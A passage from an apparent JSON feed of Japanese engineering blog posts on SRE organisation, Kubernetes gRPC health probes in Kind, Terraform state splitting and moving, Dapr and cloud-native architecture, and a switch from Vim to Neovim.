監視するとき Prometheus使うときとかつらいのでFargateは起動が遅い スケールが遅い技術選定において、自分たちの「サイズ」っていう要素が存在するというのは暗黙的なものになりがちなので、ちゃんと具体的に捉えておくの大事な気がした。 #jawsug_sre— Tomoya Kitaura (@kitta0108) 2022年2月25日  先程はパッと答えられませんでしたが、弊社の場合はMicroServiceを運用する際にはIstioを利用するケースが非常に多く、現状では対応していないため、EKSの場合はSelf Hostedを利用するケースが多いですー#jawsug_sre— TakuyaTezuka@3-shake (@tt0603) 2022年2月25日  パネルディスカッションMFのSREの組織のやり方で工夫してるところもともと中央集権的だった、開発に権限移譲していった権限を渡していっていながらそれ以上にプロダクトが開発が増えてしまったので負荷が増えてしまったenabling SREを広げる役割もつくるSREというポジションじゃなくてもSRE的な動きができるように組織にSREの文化を作り上げていくEnabling SRE | Money Forward Engineers\' Blog技術支援からSREの組織変数がいくつか システムの規模 性質 組織規模、レベル感などpure sreではじめて権限移譲していく自分たちのサイズに合わせて組織を作っていく開発とSREのベストの距離感タイミングによって違う固定されたものじゃない構成をいかにシンプルにできるかが大事SREが開発に使いやすいサービスを提供するSREのAPIを提供するので好きに使って的な横断組織SREと開発チーム内SREというパターンもあるお互いのコミュニケーションは大事採用する際に求めるスキルセットやレベル感なんでもかんでも能力を持ってる人はいない。特定の領域に得意を持ってるといい、最低限のレベル感はほしいコミュニケーション 大事 ソフトスキルの担保が大事会社のバリューにあってるかSREワークブックの最後の方求められるスキル書いてあるすべてのインフラコードはIaCに寄せたい、チームにはソフトウェアスキル、インフラスキルそれぞれ持つメンバーがほしい変更時のトラブルシューティングはできるべきコードレビューできるスキルを持っていてほしいコーディングあるていどできる人組織による開発をSREに興味をもってもらうはどうしたらいいのだろうかSLOを決めて共通言語で話す留学すると面白いかもお互いがどういう観点で仕事してるかがわかってよいどこまで開発に移譲するかエラーバジェット、SLO、SLIは必要SREが設定するSLOより開発者が設定するSLOの方がいい開発者にとってうまいところを教えるアプローチ開発者にとってもバグが出ないことによって、気持ちよく開発できるよ!開発者の観点じゃなくてビジネス観点でSLO設定するんじゃないのかなって思う。。。?あと、留学いいなあと思った。開発チームに留学したい。SREチームが存在しない。どんなフェーズになったらSREチームを作ったほうがいいというしきい値あります?開発者が開発以外に手を取られて開発スピードが落ちてるのが目に見えたら兼務の限界値がある。得意なことにバリューを出せるようにしたい開発しながらAWSの新機能をキャッチアップするのはたいへんdevとopsのバランスが崩れているとき SREのプラクティスをいれるといいのかもエラーバジェットが判断軸になるかもどれくらいのチームが困ってるかが判断軸になるToil撲滅の意味で費用対効果高かったLambdaランキング今Lambdaを殆ど使ってないchatbotが出たのでLambdaの役割を終えたEKS上にアプリケーションを作ってしまうことが多い必要悪としてのLambda コードを書くのは最終手段。書いた瞬間に負債になる時刻でEC2終了するLambdaオートスケーリングでいいのでは?terrafromでLambda扱いにくい問題SREとしてセキュリティに対しての役割サービスInspectorECRのイメージスキャンCI/CD成立してからじゃないとイメージスキャンできないGuardDutySSOIAM Userを撲滅できたただ個別要件に対応しにくいSREが見てるケースが多いコーポレートセキュリティは範疇じゃないが、アプリケーションセキュリティは範疇5,6人目にセキュリティが強い人がほしい着想の段階からセキュリティの観点をいれておきたいモニタリングロギングの観点で使用してるAWSのサービスAMPEKS使ってるのでコスパが良かったCloudWatch log通知考えるとLambda使わないとAthenaわずらわしい検索しにくいLokiとかに寄せたいログをどこにおくS3Lokiってこれかな?Grafana Loki | Grafana Labs雑感他の会社のSREの話を今まであまり聞くことがなかったので、気づきを得る部分が多かった。SREのミッション・ビジョン・バリューはちょっと考えてみたいなと思った。オンライン開催の形式はYouTube Liveがいいなあって思った。聞き逃しても巻き戻して聞き返せるのがすごい体験として良い。","link":"https://blog.masasuzu.net/entry/2022/02/26/012602","isoDate":"2022-02-25T16:26:02.000Z","dateMiliSeconds":1645806362000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Kind を利用してFeature Gates のGRPCContainerProbe を有効にしたKubernetes クラスターを構築してアルファー機能のgRPC Health Checkを試したいなー","contentSnippet":"Kind でGRPCContainerProbe がやりたいよはじめにKubernetesではLiveness & Readiness Probeを使って、Pod内のコンテナ、プロセスのヘルスチェックが行える。Kubernetes上で動くgRPCサーバーのヘルスチェックする際にはgrpc-health-probeで簡単に実装できます。readinessProbe やlivenessProbe,startupProbeにexec のcommand として実装する必要がある。どういうような方式があってみたいなのはHealth checking gRPC servers on Kubernetes | Kubernetes を参照していただければと思います。現行の場合にはこのように設定が必要  containers:  - name: server    image: \\"[YOUR-DOCKER-IMAGE]\\"    ports:    - containerPort: 5000    readinessProbe:      exec:        command: [\\"/bin/grpc_health_probe\\", \\"-addr=:5000\\"]      initialDelaySeconds: 5    livenessProbe:      exec:        command: [\\"/bin/grpc_health_probe\\", \\"-addr=:5000\\"]      initialDelaySeconds: 10tomioka-shogorila.hatenablog.comgRPC health checking が alpha feature として追加この、方式ではDockerfile内 にgrpc_health_probeを入れなくてはいけません。で、2022年2月で最新のKubernetes v1.23 では built-in gRPC health checking が alpha featureとして追加されました(同僚に教えてもらいました)。kubernetes.ioそのため、Kubernetes上で動くgRPCサーバーのヘルスチェックする際にbuilt-in でできるようになりました。  containers:  - name: server    image: \\"[YOUR-DOCKER-IMAGE]\\"    ports:    - containerPort: 5000    readinessProbe:            grpc:              port: 5000    livenessProbe:            grpc:              port: 5000しかし、これらの機能はまだ、alpha feature で機能 です。なので、defaultでは無効です。もし、試したい場合には--feature-gates として有効にしてあげればならないkubernetes.ioローカルでKubernetes クラスターを構築するにはいくつか方法があるのですが今回は、Kind を利用しているので今回もこちらを利用する。Kind でFeature Gates を利用するにはyaml で以下のように true にすることで適応できる。今回はGRPCContainerProbeをtrue にすれば良い。kubeadm でできることはKind でも大体できるのでkubeadmConfigPatches みたいな設定も忘れたくない。kind: ClusterapiVersion: kind.x-k8s.io/v1alpha4name: featuregatesnodes:- role: control-plane  image: kindest/node:v1.23.3@sha256:0df8215895129c0d3221cda19847d1296c4f29ec93487339149333bd9d899e5afeatureGates:  GRPCContainerProbe: truegithub.com最後にO11yCon での資料作成があるのにブログを書いてしまった。試験前に漫画を読み始めるみたいな感じでブログを書いてしまった。13歳からやってることは変わりません。お時間があれば見に来てください。event.cloudnativedays.jp","link":"https://syu-m-5151.hatenablog.com/entry/2022/02/22/112713","isoDate":"2022-02-22T02:27:13.000Z","dateMiliSeconds":1645496833000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"開発でよく使うツールたち","contentSnippet":"プログラミング開発をするときによく使うツールを紹介する。 ツールたちTerminal.app同じ役目のツールを複数インストールしたくないマンなので標準ターミナルを使っているHomebrewツール群を一括管理するツールtmuxターミナルのタブを使う派の人はそれでいいと思う左ペインでログ監視、右ペインでエディタとか使えて便利fishシェルコマンド補完してくれて便利プラグインをたくさん入れても軽い (気がする)Neovimいろんなプラグインを入れてカスタムしている好きなプラグインは後述fzfコマンドラインであいまい...","link":"https://zenn.dev/pranc1ngpegasus/articles/5e22bb48292d94","isoDate":"2022-02-17T15:00:00.000Z","dateMiliSeconds":1645110000000,"authorName":"Temma Fukaya","authorId":"Pranc1ngPegasus"},{"title":"Future Tech Night #20 Terraform State縛りの勉強会 #future_tech_night","contentSnippet":"future.connpass.com久しぶりにちゃんと勉強会の感想ブログ書きます。① State の分割戦略 〜ModulesとWorkspacesを利用して〜StateはTerraform上での管理を分ける意味では非常に重要な要素であり、適切に分けることで不慮の事故や予期せぬ変更からクラウドリソースを守ることができます。このセッションでは演者が実際にTerraformを利用して感じたことを交えながら、適切なStateの分割戦略とは？について話します。Stateの分割についてModuleによるアプローチとWorkspacesによるアプローチ、そしてそのあわせ技についての説明がありました。Workspacesは使ったことないのであまり知見がなかったので、いろいろ参考になる部分がありました。今のterraform運用だと環境ごとにディレクトリを切ってstateを分割してます。で、環境ごとの差異としてパラメータだけでなく、作るリソース作らないリソースが若干まちまちなので、そのままだとWorkspacesは向かないなと感じました。絶対に作るリソース、RDSやVPCなどは分割した上でWorkspacesで管理するのはありなのかなとは思いました。ただ、同じシステムで、環境毎のディレクトリとリソース毎のディレクトリが混在するのはわかりにくくならないかなという懸念はあります。悩ましいですねあと、ブランチ戦略も難しいですね。現状はmasterでprdをapplyするように、stagingでそれ以外の環境をapplyするようになってますが、全部masterでやるようにしても良いのではと思ったりもしてる今日このごろです。② クラウドリソース自体をdestroy/createdせずに、Terraformリソース定義の記述場所を変更する方法クラウドサービス上で稼働するリソースには一切手を付けずに、Terraformの定義記載場所だけを変更する方法を話します。Terraformを利用していると「このディレクトリ配置じゃダメだ。配置変えしたいのだけれど、リソースの再作成はできない。次にインフラ設計するときは、〇〇に注意しよう」という運用ナレッジが貯まると思います。スタート時点で完璧なTerraformディレクトリ設計ができれば御の字ですが、それが不可能なことは、この分野でベストプラクティスが確立されていないことにより証明されています。本パートでは「Terraformのディレクトリ配置には定石がないのだから、運用状況に合わせて柔軟に配置換えすべき」という観点から、「動作中リソースに影響なく、Terraform定義箇所を移植する方法」について話します。20220217_FutureTechNight_#20_TerraformState縛りの勉強会.pptx - Google スライドこんなふうに別のtfstateファイルにリソースをmvすることによって、Stateにリソースを移動できる手法を説明してました。terraform state mv -state-out=${moved_resource.tfstate} ${moved_resource}terraform state pull > ${to.tfstate}terraofm state mv -state=${moved_resource.tfstate} -state-out=${to.tfstate}terraform state push ${to.tfstate}State間でのリソース移動に関しては、terraform state rmとterraform importのあわせ技しか知らなかったので、新しい知見を得ました。まだ試せてないないんですが、State内での移動であれば、moved block使うのもありなのかなと思いました。ちなみリソースが消えた場合にもmove blockって使えるんですかね?なかなか他の会社のterraform運用の話を聞く機会があまりなかったので、楽しかったですね。最近勉強会出てもメモすら残さないことが多くて、せっかく参加したのにあまり有意義に時間を使えていなかったので、薄くてもいいので今後ちゃんと感想、意見を書き残していきたいと思いました。","link":"https://blog.masasuzu.net/entry/2022/02/17/210848","isoDate":"2022-02-17T12:08:48.000Z","dateMiliSeconds":1645099728000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"CloudNativeな時代に求められるWebサービス基盤モデルの再考 というタイトルで Developers Summit 2022 に登壇しました。  ","contentSnippet":"振り返りDevelopers Summit 2022 で登壇しました。CloudNativeな時代に求められるWebサービス基盤モデルの再考 - Daprについての考察と実装 というタイトルで、CloudNativeな技術と共に歩んできた中で見えてきた、CloudNativeな技術を背景に持つ分散アプリケーションランタイムであるDaprがどういったもので何ができるかを解説するのを通してCloudNativeの必要性や立ち位置について発表しました。event.shoeisha.jp今回の発表でもっと喋りたいと思ったのはDapr によって Complexity は解消されるのか？に関する部分でRepositoryが何をするのかとDapr になります。実は来週もDapr での登壇イベントがあるのでRepository 周りの話と実装面の話を重点的にさせていただきたいと思います。jjug.doorkeeper.jp登壇資料体調が悪いのに頑張って資料作りましたね。偉いです。 speakerdeck.com文字起こししておいてます。意味はないです。振り返り登壇資料自動化とコンテナの話Infrastructure as Document 時代システム運用担当者がアプリケーションを配置する方法Infrastructure as Code 時代システム運用担当者がアプリケーションをコードによって配置する約束された勝利の自動化なんてない自動化の不都合な真実最初はうまくいく腐らないようにする自動化Immutable Infrastructure自動化を進めていく中で発見された素晴らしいプラクティスコンテナへの道アプリに必要なものを全て特定のフォーマットで固めて、展開するだけで起動自動化とコンテナのざっくりとした関係インフラの腐敗を防止クラウドによるアプリケーションファーストクラウドにより組み上げ方式から呼び出し方式へコンテナによって取り扱いを共通化Cloud NativeとWebサービス基盤モデルについて再考Service Level indicator とService Level Objective信頼性 100%と、信頼性 99.99%では大きな違い各サービスごとに適切なSLOを設定することが大事Service Level Indicator の例シングルノード100 台でアプリを動かすと…　ｱｯｱｯｱｯCloud Native とは？疎結合ではないシステムとは？AvailabilityScalabilityComplexity疎結合なシステムとは？ResilientFlexible ScaleSimplicityKubernetes の特徴不変なインフラ宣言的設定自己修復機能Webサービス基盤モデルについてサービス層ストラテジー層オーケストレーション層コンテナランタイム層インフラストラクチャ層ストラテジー層の進化と拡大istioKnativeストラテジー層の拡大とDapr についてDapr とはComplexityとDapr の実装についてDapr とは？Daprの特徴Goalサイドカー パターンとは？分散システムにおけるデザインパターンの一つDapr におけるサイドカーアーキテクチャDapr の多様性ビルディングブロックビルディングブロックコンポーネントRepository において Dapr による抽象化の理想と現実Repository とはDapr によるRepository の吸収しきるのか？何を抽象化しているのか？Dapr によって Complexity は解消されるのか？Complexity とはDaprでComplexity の解消の夢は見れるか？参考資料自動化とコンテナの話Infrastructure as Document 時代システム運用担当者がアプリケーションを配置する方法人間の思考や行動をコーディングしてシステムを管理する為の秘伝のドキュメントを引き継ぐ一台一台を丁寧に設定していくが出自は不明なぜ、動いているかも分からず、さわったら動かなくなるから秘伝のタレとなりいつか腐るDocument はあるが更新されてないこともしばしばInfrastructure as Code 時代システム運用担当者がアプリケーションをコードによって配置する直訳すると「コードとしてのインフラ」、「インフラをコードで記述する」ことさまざまな手順や前提をCodeの中で表現していくことで全てが見えてくる黎明期はシステム管理の自動化がその後はソフトウェア開発プラクティスを応用するのが焦点に約束された勝利の自動化なんてない自動化の不都合な真実自動化も腐りやすい最初はうまくいくOS やミドルウェアのバージョンを上げると死ぬアプリ毎、ホスト毎に個別化、属人化やシステムの複雑化が進行自動化でトラブルので手作業が多くなっていく触るのが怖くなったら秘伝のタレが腐敗している合図腐らないようにする自動化約束されてる勝利の自動化は実は部分的Immutable Infrastructureインフラを管理する手法の一つで「一度構築した本番環境には更新やパッチの提供などの変更を加えず稼働させる」というような考え方自動化を進めていく中で発見された素晴らしいプラクティス常にクリーンインストールから開始必要なものは全て固めアプリを共存させないコンテナへの道アプリに必要なものを全て特定のフォーマットで固めて、展開するだけで起動2013年に最初にリリースされ、Docker,Inc.によって開発Dockerは「コンテナ」と呼ばれるソフトウェアパッケージを実行される起動の約束された勝利のアプリケーションベースイメージをダウンロード必要な各種ソフトウェアは全てコンテナ内にインストール必要な設定はコンテナ作成時に仕込む自動化とコンテナのざっくりとした関係同じモノとして扱いやすくなるインフラの腐敗を防止運用が統一的開発でテストし、そのままを運用に適用可能環境の影響を受けずに自動化の負担は軽減クラウドによるアプリケーションファーストクラウドにより組み上げ方式から呼び出し方式へ要求すれば下位のリソースが自動的に割り当たるコンテナによって取り扱いを共通化アプリとインフラの依存関係を断ち切ることができるCloud NativeとWebサービス基盤モデルについて再考Service Level indicator とService Level Objective信頼性 100%と、信頼性 99.99%では大きな違い信頼性 100%を実現するためには、99.99%とは異なり膨大な工数を投入が必要ほとんどのユーザーにとっては「99.99%」が「100%」になったからといって、大きなメリットがあるわけではありません\uD83E\uDD7A\uD83E\uDD7A\uD83E\uDD7A各サービスごとに適切なSLOを設定することが大事SLOとは、SLIで計測されるサービスレベルの目標値、または目標値の範囲を指しますSLOを「年99.99%」と設定すると、「1年のうち52分は稼働しなくてもよい」ということになりますしかし、シングルノード100 台でアプリを動かすと…　ｱｯｱｯｱｯService Level Indicator の例リクエストのレイテンシ（リクエストに対するレスポンスを返すまでにかかった時間）エラー率（受信したリクエストを正常に処理できなかった比率）システムスループット（単位時間あたりに処理できるリクエスト数）可用性（サービスが利用できる時間の比率）シングルノード100 台でアプリを動かすと…　ｱｯｱｯｱｯクラウドを使ったからといって…可用性が勝手に高まるわけではないシングルノードでの運用について* アプリの更新は？* サーバー自体が電源断でサービス落よね？* 負荷が増えたらどうするの？* アクセスが増えたらどうするの？何らかの方法でリスクを回避せねば、その方法の一つがKubernetesでありCloud Native となるCloud Native とは？github.comコンテナサービスメッシュマイクロサービスイミューダブルインフラストラクチャおよび宣言型APIなどを用いて回復性管理力可観測性堅牢な自動化によって変化に強い疎結合なシステムを実現する疎結合ではないシステムとは？Availabilityコンポーネントが死ぬと全体が死ぬScalability一つの機能をスケールさせるためには全体のスケールが必要Complexity新しい機能を追加するときに全体との調和が必要なので大変疎結合なシステムとは？Resilient一つのサービスが死んでも一部のサービスは継続Flexible Scaleサービスごとに独立してスケールリソースの最適化Simplicity小さな単位で開発することにより新機能の追加が容易になるKubernetes の特徴不変なインフラ一度、構築したインフラは変更を加えることなく破棄して、新しいものを構築しなおせばよいImplicit or Dynamic Grouping(入れるところないのでココに書いておきます)宣言的設定命令的に手順や変更履歴を記録するのではなく宣言的な設定ではシステムのあるべき姿を定義します。Kubernetesはこの定義ファイルを確認してあるべき姿に自律的に動作するDeclarative Configuration自己修復機能Kubernetesが障害や異常があった時にあるべき姿になる為にシステムが設定した通りにAPIを再起動したり様々な作業を自動で行うReconciliation Loopにて実現Webサービス基盤モデルについてサービス層実際のWebアプリやWebサービスのコンテンツ層ストラテジー層Webサービスの特性に合わせてコンテナ基盤をより特徴的に制御する層オーケストレーション層コンテナ群や収容ホスト群のモニタリングやリソース管理等によってCRIを介してコンテナを制御する層コンテナランタイム層コンテナそのものの制御層インフラストラクチャ層ハードウェアやVM、ベアメタル等のコンテナのリソースプールを実現する層ストラテジー層の進化と拡大istioマイクロサービスアーキテクチャにおけるネットワーク面での課題を解決する機能群を提供するKnativeモダンなサーバーレスワークロードをビルド、デプロイ、管理するためのKubernetesベースのプラットフォーム Knative など、さまざまな用途のアプリが誕生しているストラテジー層の拡大とDapr についてDapr とは効率的なクラウドネイティブアプリ開発を目指した分散アプリケーションランタイムDapr は サイドカーによりサービス間の呼び出し、ステート管理、サービス間メッセージングなどの非機能要件を実現する事で分散アプリケーションの実装上の課題を解決する機能群を提供するフレームワークです。非機能的ではあるが本来、サービス層が持っていた一部機能をストラテジー層が担っている。ComplexityとDapr の実装についてDapr とは？Distributed\xa0Application\xa0Runtime の略Daprの特徴サイドカーにより任意の開発言語やフレームワークで開発可能ベストプラクティスをビルディングブロックとして提供Goalあらゆる言語やフレームワークを使用して、分散アプリケーションを記述することが可能ベストプラクティスのビルディングブロックを提供することで、マイクロサービスアプリケーションの構築で開発者が直面する困難な問題を解決コミュニティ主導で、オープンかつベンダーニュートラルであること新たな貢献者の獲得オープンAPIによる一貫性とポータビリティの提供クラウドやエッジなど、プラットフォームにとらわれないベンダロックインすることなく、拡張性とプラグイン可能なコンポーネントを提供する高いパフォーマンスと軽量化により、IoTやエッジのシナリオを可能にする実行時に依存することなく、既存のコードからインクリメンタルに採用できるサイドカー パターンとは？分散システムにおけるデザインパターンの一つサイドカーは、アプリケーションコンテナを拡張および拡張して、機能を追加します。サイドカーを使用して既存のレガシーアプリケーションなどにも適用できます。同様に、これらを使用して、一般的な機能の実装を標準化するコンテナを作成することもできます。Dapr におけるサイドカーアーキテクチャDapr の多様性Dapr サイドカーにより、HTTP/gRPC での通信が可能であれば開発ができる公式SDKも提供されているビルディングブロックビルディングブロック一般的にはシステムアーキテクチャを構成する要素Dapr では利用可能な機能群のことを指す場合が多いマイクロサービスのベストプラクティスを体系化して機能として実装されてるサイドカーのHTTP/gRPC を呼び出してこれらを利用することができる2022年2月で 8つのビルディングブロックが用意されているサービス間呼び出し状態管理パブリッシュとサブスクライブバインダーアクター可観測性シークレットの管理構成設定コンポーネントビルディングブロックで利用される機能モジュール一つ以上の複数のコンポーネントを使用可能IF が用意されているのでこれらに合わせて機能を実装統一されたエンドポイントが利用できるのでアプリ側に複雑性を抱え込まなくて良いRepository において Dapr による抽象化の理想と現実Repository とはDDDのレイヤードアーキテクチャで提唱されいるRepository でインターフェースを定義することによりInfra層を抽象化、依存性の逆転モックの差し替えが可能になり、Application層のユニットテストが可能になるDapr によるRepository の吸収しきるのか？何を抽象化しているのか？Repository は、抽象化とレイヤー化を同時に行うのが一般的Dapr は前述したビルディングブロックと公式のSDKによってプロトコルの抽象化が可能抽象化に合わせた実装を一部しなくても良いので全体の実装量はそりゃ、減るチームでどのような実装にしていくか話し合いが必要であり、レイヤー化に関してはあまり寄与しないDapr によって Complexity は解消されるのか？Complexity とは認識や変更を困難にするソフトウェアの構造に関する全てのものを指しますどれだけ実装が「複雑」でも開発者が読み書きする必要がないようになっていれば、それはComplexityとは言いませんProxy が担う部分はまだ、機能がまだ少ないDaprでComplexity の解消の夢は見れるか？Dapr によって抽象化の一部のメリットは得られるDapr でもレイヤー化するのは自分達であることを忘れずにMockClient みたいな話がgo-sdk でも出ればいいが特にないので自分達で用意する必要がある参考資料Dapr Docshttps://docs.dapr.io/Infrastructure as Codeのこれまでとこれから/Infra Study Meetup #1 よりhttps://forkwell.connpass.com/event/171560/ふつうのLinuxプログラミング 第2版　Linuxの仕組みから学べるgccプログラミングの王道https://www.sbcr.jp/product/4797386479/コンテナ時代のWebサービス基盤モデル - FastContainerの研究発表をしてきましたhttps://rand.pepabo.com/article/2017/06/28/iot38-matsumotory/目的に沿ったDocumentation as Codeをいかにして実現していくか / PHPerKaigi 2021https://speakerdeck.com/k1low/phperkaigi-2021クラウドネイティブとKubernetes（だいたいあってるクラウドネイティブ）https://speakerdeck.com/hiro_kamezawa/kuraudoneiteibutokubernetes-daitaiatuterukuraudoneiteibuDesigning Distributed Systems (PUBLISHED BY: O\'Reilly Media, Inc.)https://learning.oreilly.com/library/view/designing-distributed-systems/9781491983638/ボトムアップドメイン駆動設計https://nrslib.com/bottomup-ddd/Repositoryによる抽象化の理想と現実/Ideal and reality of abstraction by Repositoryhttps://speakerdeck.com/sonatard/ideal-and-reality-of-abstraction-by-repositoryA Philosophy of Software Designhttps://web.stanford.edu/~ouster/cgi-bin/book.php","link":"https://syu-m-5151.hatenablog.com/entry/2022/02/17/182336","isoDate":"2022-02-17T09:23:36.000Z","dateMiliSeconds":1645089816000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"脆弱性によるセキュリティリスクへの効果的な対処法とは？対策の流れを徹底解説！ | sreake.com","contentSnippet":"システムに脆弱性があると悪意のある攻撃が行われる可能性があり、セキュリティリスクを抱える原因になります。脆弱性が生じる原因は複数あるため、原因を理解したうえで効果的な対処を行わなければなりません。 今回は脆弱性によるセキ […]The post 脆弱性によるセキュリティリスクへの効果的な対処法とは？対策の流れを徹底解説！ | sreake.com first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/vulnerability-security-risk/","isoDate":"2022-02-14T13:37:15.000Z","dateMiliSeconds":1644845835000,"authorName":"Sreake","authorId":"Sreake"},{"title":"さよなら、俺のVim。Neovim への旅立ち","contentSnippet":"はじめにこんにちは、nwiizo です。私は今から10年前にVim を使い始めました。Vimはviから発展したテキストエディタです。コード補完、コンパイルまたエラージャンプなど、プログラミングに特化した機能が豊富で、広くプログラマに使用されています。私も思考のスピードでの編集をvim で実践してきた1人でした。2022年の現在ではVim vs Emacsなど言われていた時代も遠い過去になり、VSCode１強になりつつあります。そういう、私も少ない設定で動作する強力で最高のJetBrainsやVSCode に浮気をした回数は数え切れません。IDEの生産性を身に染みて感じながらも、身についた操作感/キーバインド及びターミナルからの起動の速さが辞められず。しかし、vimrc を強力に設定しているわけでもなく愛の力のみで心の擬似IDEとしてのvimを使っておりました。進まねばならぬこのままでは愛に沈む。愛に殉じたいが痛いおじさんになりたくない。意を決してVim からNeoVimへの移行を決めました。俺のvimrc過去にはこんなことを言ってた。やってること変わってない。syu-m-5151.hatenablog.comgithub.com初期構想をやめましたNeovim + coc.nvim + (Neo)vim Plugin で初期構想を考え手を動かしてましたが、結果として断念しました。理由として、今夜中に変更したかったこと。既存のプラグインに、そんなに力を入れていなかったこと。深夜テンションで入れ替えを行なった為に、下調べが足らずにプラグインの選定や大量に入れたプラグインの起動時間の短縮などがめっ… 難しかったからです。起動時間を短縮しようとしてる様ですこちらのドキュメントは非常に参考になりました。ありがとうございます。zenn.dev選ばれたのは、よい設定を求めてインターネットをさすらっているとvim-config なるリポジトリに出会いました。欲しかったプラグインがほとんど入っており、何より先ほどまで苦戦していた起動時間が短いという単語に惹かれてすぐに入れて動かしてみました。github.comvim-configがどのようなプラグインや設定を使ってどのように設定を実現させているかやいくつかのショートカットについてはリポジトリで確認お願いします。おそらく、それだけでかなり、勉強できるのでおすすめです。使用感は最高でプラグインのショートカットをいくつか試したりコードを書いたりしました。また、各言語の設定については~/.config/nvim/config/local.plugins.yaml などに設定を入れておくと良いですが。私は、vim-goを入れました(がのちに削除)。:GoDef による定義位置ジャンプは vim-lsp が有効になっていれば gd で可能です(sbで前のbufferに戻れるのでそれで行き来できる。)。公式ドキュメントの設定に従ってImports を設定する。その内にlspの自動補完が上手くいってないことに気付いたので色々設定を見ていき~/.local/share/nvim/ などの共有設定に阻害される設定が入っていたので移動させた結果、無事にlsp 自動補完も動作しました。さいごにこれが大好きだったvim との別れです。今日からはこれでコーディングしてみたいと思います。大好きだったvimが強くなり、帰還した。そういう、感じがして今日はとても素敵な気分です。朝会で共有したらVSCodeではないのかって笑いが起きました。ちゃんと前に進んでいるいい職場です。私のnvim の設定をこちらに置いておきます。現在はこちらでいくつかのlspを入れて開発しております。github.com実践Vim　思考のスピードで編集しよう！ (アスキー書籍)作者:Ｄｒｅｗ Ｎｅｉｌ,新丈 径角川アスキー総合研究所Amazon","link":"https://syu-m-5151.hatenablog.com/entry/2022/02/08/130305","isoDate":"2022-02-08T04:03:05.000Z","dateMiliSeconds":1644292985000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"『Learning Dapr』を読んだので感想文","contentSnippet":"『Learning Dapr』を読んだ。輪読会ではなく共有会としての読書感想文を記載しました。Dapr に関する素晴らしい書籍だと思うので共有会を通して皆さんに共有したいと思います。誰が読むべきか？Dapr の実装が必要な方分散システムに関して兎に角見聞を広げたい方Learing Dapr についてlearning.oreilly.comどんな本なのか？Daprがステートレス、ステートフル、アクタープログラミングモデルを統合するだけでなく、クラウドやエッジのあらゆる場所で実行される方法を背景からその将来について開発者自ら、説明してくれている書籍。話の主軸がDaprであるためどうしても、Daprを利用する以外では他の書籍を読んだ方が効率が良いというか理解しやすいと思う。分散システムの実装に関して別の観点から理解を深めたければ読めば良いと思うまた、どんな本ではないのか？分散システムを学べる本ではないKubernetes が学べる本ではない主要なコンテナオーケストレーターであるKubernetesを本番環境で動かすために役立つベストプラクティスやKubernetes の概念が学べる本ではない。Production KubernetesGolang に入門できる本ではないGolang の入門的な内容はなく各章ごとに適当な言語で書かれているThe Go Programming Languageマイクロサービスに関する本ではないマイクロサービスのためのシステム分割や設計のレベルから解説する本ではない。あくまでdapr のための書籍であってシステム分割や設計が前提としてマイクロサービスパターン 実践的システムデザインのためのコード解説 - インプレスブックスDapr とはそもそも、Dapr とは、Microsoftが中心になって開発しているOSSの分散アプリケーションランタイム、Distributed Application Runtimeの略でDaprです。Dapr は様々なクラウドサービスやミドルウェアを良い感じに透過的に扱うことを目的としたプロダクトで、なかなか筋が良いのですが、何に使えるかよく分からないというか、そもそもどういうものか分かりづらいので今回はオライリーから出版されたLearning Dapr を年末に読んだので共有会で共有していこうと思います。スター数が15K とかなりいきおいのあるOSSのプロジェクトではないかと思いますDaprの特徴Dapr はサイドカーとして利用することで。本来実装したいコアロジックに集中でき簡単にマイクロサービスを作成することができます。また、デプロイする環境はKubernetes もしくはローカル環境を選ぶことが来ます。更にそれぞれのビルディングブロックは抽象化されており、 HTTP/gRPC API を通して利用するものとなっているため言語に縛られない開発ができるのも魅力となっています。それぞれのコンポーネントはライブラリとしてアプリケーションに組み込むのではなく、yamlのコンポーネント定義ファイルをロードさせることで利用することができるので実装に一切手を加えず、検証環境ではredis、本番環境では何かしらのクラウドサービスなど切り替えが可能。Service-to-service invocation: /v1.0/invoke他のマイクロサービスサービスへ通信するための機能State management: /v1.0/statekey/valueベースの永続化や参照機能Publish and subscribe: /v1.0/publish and /v1.0/subscribePublish/subscribeモデルで非同期にメッセージを送受信する機能Resource bindings: /v1.0/bindings外部コンポーネントやサービスを抽象化しイベントの送受信を行う機能Actors: /v1.0/actors分散性や並行・並列性をもち、非同期なメッセージ駆動のアクターモデルを提供Observabilityログ・トレース・メトリクス・ヘルスチェックといったオブザーバビリティに必要な要素を提供(この辺の情報は整理してObservability Conference 2022にCfPに投げます)Secrets: /v1.0/secrets安全にパスワードなどのクレデンシャルなデータにアクセスする機能Extensible拡張性に優れたミドルウェアRate limit やOAuth2 、Open Policy Agent などさまざまな機能をミドルウェアとして実装可能となっています。  components-contrib/middleware/http at master \xb7 dapr/components-contribサポートしてるSDKdaprが提供する HTTP/gRPC API にアクセスするためのsdkを利用することもできます(クライアント同士の直接参照も可能なので)。提供されているSDKは、以下の8つの言語になります。Java-sdkPython-sdkDotnet-sdkJs-sdkGo-sdkCpp-sdkPHP-SDKWIP: Rust-sdk今後、サンプルを書く際にはGo-sdk を利用して書いていくこととします。Dashboard個人的に気に入っている機能としてはダッシュボードの存在があります。Kubernetes に対しても実行できるので非常に重宝をしております。https://github.com/dapr/dashboard/blob/master/docs/development/changelog.mdやっと、目次全7章から成り立っています。どの章も公式ドキュメントよりも背景であったりとかメタ情報が付与されており1. Services2. State3. Messaging4. Security5. Actors6. Application Patterns7. Dapr’s Future1. ServicesDapr 対応アプリケーションの基本的な単位はサービスと呼ばれます。この章では各サービスの状態管理やトレース、必要なときに安全な通信様々な機能がどのように使えるのかを簡単に説明した章になります。この章までであれば公式ドキュメントを読めば大体なんとかなる2. StateDapr の状態管理は、プラットフォームに依存しないクリーンな状態処理コードを記述しながら、これらの課題に対処するのに役立つ単純な状態APIを提供することを目的としています。状態管理についてクラウド化や様々なデータストアにどのように対応していくかどういった方法が取れるかなどが記載がされております。3. MessagingDapr は pub/sub にKafka やRabbitMQなどをバインディングすることが可能で一般的なメッセージング構造を提供しますが、独自のメッセージングバックボーンを作成しません。Dapr の pub/subを使用すると、メッセージパブリッシャーはトピックにメッセージをパブリッシュでき、トピックのすべてのサブスクライバーはメッセージのコピーを取得できます。Daprは、メッセージが少なくとも1回処理されることを保証します。上記で説明したようにDaprはpub/sub 